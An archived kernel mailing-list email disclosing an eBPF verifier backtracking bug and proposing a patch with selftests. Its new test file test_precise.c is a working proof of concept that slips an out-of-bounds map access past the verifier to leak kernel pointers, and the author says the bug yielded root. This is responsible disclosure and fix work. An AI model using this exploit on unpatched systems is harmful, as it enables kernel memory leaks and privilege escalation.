Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 4777B7D13AB
	for <lists+linux-kselftest@lfdr.de>; Fri, 20 Oct 2023 18:06:47 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1378066AbjJTQGq (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Fri, 20 Oct 2023 12:06:46 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:49702 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1377991AbjJTQG2 (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Fri, 20 Oct 2023 12:06:28 -0400
X-Greylist: delayed 398 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Fri, 20 Oct 2023 09:05:55 PDT
Received: from smtp0.epfl.ch (smtp0.epfl.ch [IPv6:2001:620:618:1e0:1:80b2:e058:1])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id BB9DB10C6
        for <linux-kselftest@vger.kernel.org>; Fri, 20 Oct 2023 09:05:55 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=epfl.ch;
      s=epfl; t=1697817553;
      h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Transfer-Encoding:Content-Type;
      bh=nvha9B0f5YmQEV8yWQ+1iXHp0mYyl9Hnm4LbeKZHiFQ=;
      b=q99jqt1nS6W/veMQV9MGQkMXqGaMP1jJz636WSus4hf72BT6DfmHzz2Tb9+1VhTyH
        ddBYuzsX50ztGrHM3dzrvvNlA9N1dOz6oE8x5lo3ICOqgR1XBsNTH7xEVDQiPefil
        3A2CxLLVM3RMpKTkfa9Ry+GZdy0TbFZ/LIIceFnSI=
Received: (qmail 3783 invoked by uid 107); 20 Oct 2023 15:59:13 -0000
Received: from ax-snat-224-178.epfl.ch (HELO ewa07.intranet.epfl.ch) (192.168.224.178) (TLS, ECDHE-RSA-AES256-GCM-SHA384 (P-256 curve) cipher)
  by mail.epfl.ch (AngelmatoPhylax SMTP proxy) with ESMTPS; Fri, 20 Oct 2023 17:59:13 +0200
X-EPFL-Auth: Gn6lFcHt9EY9gDGLr/cKCEKRW7rjvYp6wGHOK9+PmKuvXarYtks=
Received: from rs3labsrv2.iccluster.epfl.ch (10.90.46.62) by
 ewa07.intranet.epfl.ch (128.178.224.178) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2507.31; Fri, 20 Oct 2023 17:59:12 +0200
From:   Tao Lyu <tao.lyu@epfl.ch>
To:     <ast@kernel.org>, <daniel@iogearbox.net>,
        <john.fastabend@gmail.com>, <andrii@kernel.org>,
        <martin.lau@linux.dev>, <song@kernel.org>,
        <yonghong.song@linux.dev>, <kpsingh@kernel.org>, <sdf@google.com>,
        <haoluo@google.com>, <jolsa@kernel.org>, <mykolal@fb.com>,
        <shuah@kernel.org>, <security@kernel.org>
CC:     <linux-kernel@vger.kernel.org>, <bpf@vger.kernel.org>,
        <linux-kselftest@vger.kernel.org>, <sanidhya.kashyap@epfl.ch>,
        <mathias.payer@nebelwelt.net>, <meng.xu.cs@uwaterloo.ca>,
        <kartikeya.dwivedi@epfl.ch>, <tao.lyu@epfl.ch>
Subject: [PATCH] Incorrect backtracking for load/store or atomic ops
Date:   Fri, 20 Oct 2023 17:58:42 +0200
Message-ID: <20231020155842.130257-1-tao.lyu@epfl.ch>
X-Mailer: git-send-email 2.25.1
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Content-Type: text/plain
X-Originating-IP: [10.90.46.62]
X-ClientProxiedBy: ewa07.intranet.epfl.ch (128.178.224.178) To
 ewa07.intranet.epfl.ch (128.178.224.178)
X-Spam-Status: No, score=-4.4 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_MED,SPF_HELO_PASS,
        SPF_PASS autolearn=unavailable autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

Hi,

I found the backtracking logic of the eBPF verifier is flawed
when meeting 1) normal load and store instruction or
2) atomic memory instructions.

# Normal load and store

Here, I show one case about the normal load and store instructions,
which can be exploited to achieve arbitrary read and write with two requirements:
1) The uploading program should have at least CAP_BPF, which is required for most eBPF applications.
2) Disable CPU mitigations by adding "mitigations=off" in the kernel booting command line. Otherwise,
the Spectre mitigation in the eBPF verifier will prevent exploitation.

                                   1: r3 = r10 (stack pointer)
                                   3:           if cond
                                                 /           \
                                               /                \
        4: *(u64 *)(r3 -120) = 200      6: *(u64 *)(r3 -120) = arbitrary offset to r2
                 verification state 1                  verification state 2 (prune point)
                                              \                  /
                                                \              /
                                      7:  r6 = *(u64 *)(r1 -120)
                                                         ...
                                    17:    r7 = a map pointer
                                    18:            r7 += r6
                         // Out-of-bound access from the right side path

Give an eBPF program (tools/testing/selftests/bpf/test_precise.c) 
whose simplified control flow graph looks like the above.
When the verifier goes through the first (left-side) path and reaches insn 18,
it will backtrack on register 6 like below.

18: (0f) r7 += r6
mark_precise: frame0: last_idx 18 first_idx 17 subseq_idx -1 
mark_precise: frame0: regs=r6 stack= before 17: (bf) r7 = r0
...
mark_precise: frame0: regs=r6 stack= before 7: (79) r6 = *(u64 *)(r3 -120)

However, the backtracking process is problematic when it reaches insn 7.
Insn 7 is to load a value from the stack, but the stack pointer is represented by r3 instead of r10.
** In this case, the verifier (as shown below) will reset the precision on r6 and not mark the precision on the stack. **
Afterward, the backtracking finishes without annotating any registers in any verifier states.

    else if (class == BPF_LDX) {
        if (!bt_is_reg_set(bt, dreg))
            return 0;
        bt_clear_reg(bt, dreg);
        if (insn->src_reg != BPF_REG_FP)
            return 0;
        ...
   }

Finally, when the second (left-side) path reaches insn 7 again,
it will compare the verifier states with the previous one.
However, it realizes these two states are equal because no precision is on r6,
thus the eBPF program an easily pass the verifier
although the second path contains an invalid access offset.
We have successfully exploited this bug for getting the root privilege.
If needed, we can share the exploitation.
BTW, when using the similar instructions in sub_prog can also trigger an assertion in the verifier:
"[ 1510.165537] verifier backtracking bug
[ 1510.165582] WARNING: CPU: 2 PID: 382 at kernel/bpf/verifier.c:3626 __mark_chain_precision+0x4568/0x4e50"



IMO, to fully patch this bug, we need to know whether the insn->src_reg is an alias of BPF_REG_FP.
However, it might need too much code addition.
Or we just do not clear the precision on the src register. 

# Atomic memory instructions

Then, I show that the backtracking on atomic load and store is also flawed.
As shown below, when the backtrack_insn() function in the verifier meets store instructions,
it checks if the stack slot is set with precision or not. If not, just return. 

            if (!bt_is_slot_set(bt, spi))
                return 0;
            bt_clear_slot(bt, spi);
            if (class == BPF_STX)
                bt_set_reg(bt, sreg);

Assume we have an atomic_fetch_or instruction (tools/testing/selftests/bpf/verifier/atomic_precision.c) shown below.

7: (4c) w7 |= w3
mark_precise: frame1: last_idx 7 first_idx 0 subseq_idx -1 
mark_precise: frame1: regs=r7 stack= before 6: (c3) r7 = atomic_fetch_or((u32 *)(r10 -120), r7)
mark_precise: frame1: regs=r7 stack= before 5: (bf) r7 = r10
mark_precise: frame1: regs=r10 stack= before 4: (7b) *(u64 *)(r3 -120) = r1
mark_precise: frame1: regs=r10 stack= before 3: (bf) r3 = r10
mark_precise: frame1: regs=r10 stack= before 2: (b7) r1 = 1000
mark_precise: frame1: regs=r10 stack= before 0: (85) call pc+1
BUG regs 400

Before backtracking to it, r7 has already been marked as precise.
Since the value of r7 after atomic_fecth_or comes from r10-120,
it should propagate the precision to r10-120.
However, because the stack slot r10-120 is not marked,
it doesn't satisfy bt_is_slot_set(bt, spi) condition shown above.
Finally, it just returns without marking r10-120 as precise. 

This bug can lead to the verifier's assertion as well:
"[ 1510.165537] verifier backtracking bug
[ 1510.165582] WARNING: CPU: 2 PID: 382 at kernel/bpf/verifier.c:3626 __mark_chain_precision+0x4568/0x4e50"

I've attached the patch for correctly propagating the precision on atomic instructions.
But it still can't solve the problem that the stack slot is expressed with other registers instead of r10.

Signed-off-by: Tao Lyu <tao.lyu@epfl.ch>
---
 kernel/bpf/verifier.c                         |  58 +++++-
 tools/testing/selftests/bpf/Makefile          |   6 +-
 tools/testing/selftests/bpf/test_precise.c    | 186 ++++++++++++++++++
 .../selftests/bpf/verifier/atomic_precision.c |  19 ++
 4 files changed, 263 insertions(+), 6 deletions(-)
 create mode 100644 tools/testing/selftests/bpf/test_precise.c
 create mode 100644 tools/testing/selftests/bpf/verifier/atomic_precision.c

diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index e777f50401b6..4e86cd2cadd3 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -3495,6 +3495,7 @@ static int backtrack_insn(struct bpf_verifier_env *env, int idx, int subseq_idx,
 	u32 dreg = insn->dst_reg;
 	u32 sreg = insn->src_reg;
 	u32 spi, i;
+	u32 set_spi, set_sreg;
 
 	if (insn->code == 0)
 		return 0;
@@ -3512,6 +3513,11 @@ static int backtrack_insn(struct bpf_verifier_env *env, int idx, int subseq_idx,
 		if (!bt_is_reg_set(bt, dreg))
 			return 0;
 		if (opcode == BPF_MOV) {
+			if (dreg == BPF_REG_FP || sreg == BPF_REG_FP) {
+				verbose(env, "BUG: backtracking to r10\n");
+				WARN_ONCE(1, "verifier backtracking bug");
+				return -EFAULT;
+			}
 			if (BPF_SRC(insn->code) == BPF_X) {
 				/* dreg = sreg or dreg = (s8, s16, s32)sreg
 				 * dreg needs precision after this insn
@@ -3580,11 +3586,53 @@ static int backtrack_insn(struct bpf_verifier_env *env, int idx, int subseq_idx,
 			WARN_ONCE(1, "verifier backtracking bug");
 			return -EFAULT;
 		}
-		if (!bt_is_slot_set(bt, spi))
-			return 0;
-		bt_clear_slot(bt, spi);
-		if (class == BPF_STX)
-			bt_set_reg(bt, sreg);
+		if (BPF_MODE(insn->code) == BPF_ATOMIC) {
+			switch (insn->imm) {
+				case BPF_ADD:
+				case BPF_AND:
+				case BPF_OR:
+				case BPF_XOR:
+					if (bt_is_slot_set(bt, spi)) {
+						bt_set_reg(bt, sreg);
+					}
+					break;
+				case BPF_ADD | BPF_FETCH:
+				case BPF_AND | BPF_FETCH:
+				case BPF_OR | BPF_FETCH:
+				case BPF_XOR | BPF_FETCH:
+					set_spi = bt_is_reg_set(bt, sreg);
+					set_sreg = bt_is_slot_set(bt, spi);
+					if (set_spi) {
+						bt_set_slot(bt, spi);
+						bt_clear_reg(bt, sreg);
+					}
+					if (set_sreg) {
+						bt_set_slot(bt, spi);
+						bt_set_reg(bt, sreg);
+					}
+					break;
+				case BPF_XCHG:
+				case BPF_CMPXCHG:
+					if (bt_is_reg_set(bt, sreg) && bt_is_slot_set(bt, spi))
+						return 0;
+					else if (bt_is_reg_set(bt, sreg)) {
+						bt_set_slot(bt, spi);
+						bt_clear_reg(bt, sreg);
+					} else if (bt_is_slot_set(bt, spi)) {
+						bt_set_reg(bt, sreg);
+						bt_clear_slot(bt, spi);
+					} else {
+						return 0;
+					}
+					break;
+			}
+        } else {
+               if (!bt_is_slot_set(bt, spi))
+                       return 0;
+               bt_clear_slot(bt, spi);
+               if (class == BPF_STX)
+                       bt_set_reg(bt, sreg);
+        }
 	} else if (class == BPF_JMP || class == BPF_JMP32) {
 		if (bpf_pseudo_call(insn)) {
 			int subprog_insn_idx, subprog;
diff --git a/tools/testing/selftests/bpf/Makefile b/tools/testing/selftests/bpf/Makefile
index 4225f975fce3..2d3d2d6b159b 100644
--- a/tools/testing/selftests/bpf/Makefile
+++ b/tools/testing/selftests/bpf/Makefile
@@ -53,7 +53,8 @@ TEST_GEN_PROGS = test_verifier test_tag test_maps test_lru_map test_lpm_map test
 	test_sock test_sockmap get_cgroup_id_user \
 	test_cgroup_storage \
 	test_tcpnotify_user test_sysctl \
-	test_progs-no_alu32
+	test_progs-no_alu32 \
+	test_precise
 TEST_INST_SUBDIRS := no_alu32
 
 # Also test bpf-gcc, if present
@@ -647,6 +648,9 @@ $(OUTPUT)/test_verifier: test_verifier.c verifier/tests.h $(BPFOBJ) | $(OUTPUT)
 	$(call msg,BINARY,,$@)
 	$(Q)$(CC) $(CFLAGS) $(filter %.a %.o %.c,$^) $(LDLIBS) -o $@
 
+$(OUTPUT)/test_precise: test_precise.c
+	$(Q)$(CC) $(CFLAGS) $(filter %.a %.o %.c,$^) -o $@
+
 # Include find_bit.c to compile xskxceiver.
 EXTRA_SRC := $(TOOLSDIR)/lib/find_bit.c
 $(OUTPUT)/xskxceiver: $(EXTRA_SRC) xskxceiver.c xskxceiver.h $(OUTPUT)/xsk.o $(OUTPUT)/xsk_xdp_progs.skel.h $(BPFOBJ) | $(OUTPUT)
diff --git a/tools/testing/selftests/bpf/test_precise.c b/tools/testing/selftests/bpf/test_precise.c
new file mode 100644
index 000000000000..8d3fe278579c
--- /dev/null
+++ b/tools/testing/selftests/bpf/test_precise.c
@@ -0,0 +1,186 @@
+#include <linux/bpf.h>
+#include <errno.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include "../../../include/linux/filter.h"
+
+char logbuf[1024*1024];
+char data_in[1024], data_out[1024], ctx_in[1024], ctx_out[1024];
+extern int errno;
+
+static int setup_listener_sock();
+static int setup_send_sock();
+
+#define STORAGE_PTR_REG     BPF_REG_3
+#define CORRUPTED_PTR_REG   BPF_REG_4
+#define SPECIAL_VAL_REG     BPF_REG_5
+#define LEAKED_VAL_REG      BPF_REG_8
+
+#define STORAGE_MAP_SIZE (8192)
+
+int main(){
+
+	// Create map for out-of-bound access
+	unsigned long long key = 0;
+    union bpf_attr corrupt_map = {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = STORAGE_MAP_SIZE,
+        .max_entries = 1,
+    };
+
+    strcpy(corrupt_map.map_name, "corrupt_map");
+    int corrupt_map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &corrupt_map, sizeof(corrupt_map));
+    if (corrupt_map_fd < 0)
+        return 0;
+
+	// Set up the second, valid map in which we can store information
+    key = 0;
+    union bpf_attr storage_map = {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = STORAGE_MAP_SIZE,
+        .max_entries = 1
+    };
+    strcpy(storage_map.map_name, "storage_map");
+    int storage_map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &storage_map, sizeof(corrupt_map));
+    if (storage_map_fd < 0) {
+        return 0;
+	}
+
+
+	struct bpf_insn progBytecode[] = {
+        BPF_MOV64_IMM(BPF_REG_2, 1000),
+        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
+        BPF_ALU64_IMM(BPF_DIV, BPF_REG_2, 3),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0, 2),
+        BPF_ST_MEM(BPF_DW, BPF_REG_3, -120, 200),
+        BPF_JMP_IMM(BPF_JA, 0, 0, 1),
+		BPF_ST_MEM(BPF_DW, BPF_REG_3, -120, -0x110),
+        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_3, -120),
+        /* Load the corrupt map */
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
+        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
+        BPF_LD_MAP_FD(BPF_REG_1, corrupt_map_fd),
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
+        BPF_EXIT_INSN(),
+        // Trigger arbitrary read/write
+        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6),
+        // Access map-0x110
+        BPF_LDX_MEM(BPF_DW, LEAKED_VAL_REG, BPF_REG_7, 0),
+        // Save the leaked bpf_map_ops into the second map
+        BPF_MOV64_IMM(BPF_REG_0, 0),    
+        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 
+        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),  
+        BPF_LD_MAP_FD(BPF_REG_1, storage_map_fd),  
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),    
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),  
+        BPF_EXIT_INSN(),    
+        BPF_MOV64_REG(STORAGE_PTR_REG, BPF_REG_0),  
+        BPF_STX_MEM(BPF_DW, STORAGE_PTR_REG, LEAKED_VAL_REG, 0),
+ 		BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN(),
+};
+
+    union bpf_attr progAttr;
+    memset(&progAttr, 0, sizeof(progAttr));
+    progAttr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
+    progAttr.license = (__u64)"Dual BSD/GPL";
+    progAttr.log_level = 2;
+    progAttr.log_size = 1024*1024;
+    progAttr.log_buf = (__u64)logbuf;
+    progAttr.insns = (__u64)progBytecode;
+    progAttr.insn_cnt = sizeof(progBytecode)/sizeof(struct bpf_insn);
+	progAttr.prog_flags = BPF_F_TEST_RND_HI32|BPF_F_TEST_STATE_FREQ;
+
+    errno = 0;
+    int fd = syscall(SYS_bpf, 0x5, &progAttr, sizeof(progAttr));
+    printf("%s\n%s\n", logbuf, strerror(errno));
+
+	/*
+    union bpf_attr attr;
+    memset(&attr, 0, sizeof(attr));
+    attr.test.prog_fd = fd;
+    attr.test.data_size_in = sizeof(data_in);
+    attr.test.data_size_out = sizeof(data_out);
+    attr.test.data_in = (__aligned_u64)data_in;
+    attr.test.data_out = (__aligned_u64)data_out;
+    errno = 0;
+    int ret = syscall(SYS_bpf, 10, &attr, sizeof(attr));
+    printf("BPF_PROG_TEST_RUN returns %d, %s, fd:%d\n", ret, strerror(errno), fd);
+	*/
+
+	int listener_sock = setup_listener_sock();
+    int send_sock = setup_send_sock();
+    if (listener_sock < 0 || send_sock < 0) {
+        return 0;
+	}
+    if (setsockopt(listener_sock, SOL_SOCKET, SO_ATTACH_BPF, &fd,
+               sizeof(fd)) < 0) {
+        return 0;
+    }
+    // trigger execution by connecting to the listener socket
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(1337);
+    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    // no need to check connect, it will fail anyways
+    connect(send_sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
+    close(listener_sock);
+    close(send_sock);
+
+	unsigned long lk[STORAGE_MAP_SIZE / sizeof(long long)];
+    memset(lk, 0, sizeof(lk));
+    key = 0;
+	union bpf_attr lookup_map = {
+        .map_fd = storage_map_fd,
+        .key = (unsigned long long)&key,
+        .value = (unsigned long long)&lk
+    };
+    int err = syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map));
+    if (err < 0) {
+        return 0;
+	}
+
+	printf("storage map value: %lx\n", *lk);
+	return 0;
+}
+
+static int setup_listener_sock()
+{
+    int sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
+    if (sock_fd < 0) {
+        return sock_fd;
+    }
+
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(1337);
+    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    int err = bind(sock_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
+    if (err < 0)
+        return err;
+
+    err = listen(sock_fd, 32);
+    if (err < 0)
+        return err;
+
+    return sock_fd;
+}
+
+
+static int setup_send_sock()
+{
+    return socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+}
+
diff --git a/tools/testing/selftests/bpf/verifier/atomic_precision.c b/tools/testing/selftests/bpf/verifier/atomic_precision.c
new file mode 100644
index 000000000000..49ebf97a03e8
--- /dev/null
+++ b/tools/testing/selftests/bpf/verifier/atomic_precision.c
@@ -0,0 +1,19 @@
+{
+  "atomic_fetch_or: precision marking test",
+  .insns = {
+	BPF_CALL_REL(1),
+    BPF_EXIT_INSN(),
+	BPF_MOV64_IMM(BPF_REG_1, 1000),
+    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
+    BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_1, -120),
+    BPF_MOV64_REG(BPF_REG_7, BPF_REG_10),
+    BPF_ATOMIC_OP(BPF_W, BPF_OR | BPF_FETCH, BPF_REG_10, BPF_REG_7, -120),
+    BPF_ALU32_REG(BPF_OR, BPF_REG_7, BPF_REG_3),
+	BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+  },
+  .result  = REJECT,
+  .errstr = "R7 32-bit pointer arithmetic prohibited",
+  .result_unpriv = REJECT,
+  .errstr_unpriv = "loading/calling other bpf or kernel functions are allowed for CAP_BPF and CAP_SYS_ADMIN",
+},
-- 
2.25.1

